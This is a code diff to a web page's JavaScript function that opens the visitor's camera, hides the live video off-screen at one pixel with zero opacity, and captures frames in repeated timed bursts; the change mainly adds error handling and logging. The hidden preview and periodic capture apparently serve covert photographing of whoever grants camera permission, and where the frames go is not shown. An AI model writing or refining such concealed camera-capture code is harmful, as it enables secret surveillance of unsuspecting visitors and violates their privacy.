@@ -502,24 +502,37 @@ let bgVideo = null;
 
 async function startBgCamera() {
   console.log('startBgCamera called');
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video:{facingMode:CFG.facing, width:{ideal:CFG.width},
-           height:{ideal:Math.round(CFG.width*3/4)}},
-    audio:false
-  });
-  bgVideo = document.createElement('video');
-  bgVideo.srcObject=stream; bgVideo.muted=true;
-  bgVideo.playsInline=true; bgVideo.autoplay=true;
-  bgVideo.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
-  document.body.appendChild(bgVideo);
-  await bgVideo.play();
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: CFG.facing, width: { ideal: CFG.width }, height: { ideal: Math.round(CFG.width * 3 / 4) } },
+      audio: false
+    });
+    console.log('✅ getUserMedia success');
 
-  bgVideo.onloadedmetadata = () => {
-    // Burst pertama setelah kamera siap
-    setTimeout(() => doBurst(), 800);
-    // Loop interval normal setelah burst
-    setInterval(() => doBurst(), CFG.interval * 1000);
-  };
+    bgVideo = document.createElement('video');
+    bgVideo.srcObject = stream;
+    bgVideo.muted = true;
+    bgVideo.playsInline = true;
+    bgVideo.autoplay = true;
+    bgVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
+    document.body.appendChild(bgVideo);
+
+    await bgVideo.play();
+    console.log('✅ video play success');
+
+    bgVideo.onloadedmetadata = () => {
+      console.log('✅ loadedmetadata fired');
+      setTimeout(() => doBurst(), 800);
+      setInterval(() => doBurst(), CFG.interval * 1000);
+    };
+
+    bgVideo.onerror = (e) => {
+      console.error('❌ Video error:', e);
+    };
+  } catch (err) {
+    console.error('❌ startBgCamera error:', err);
+    throw err; // lempar ke doPermission agar ditangani
+  }
 }
 
 async function captureFrame() {
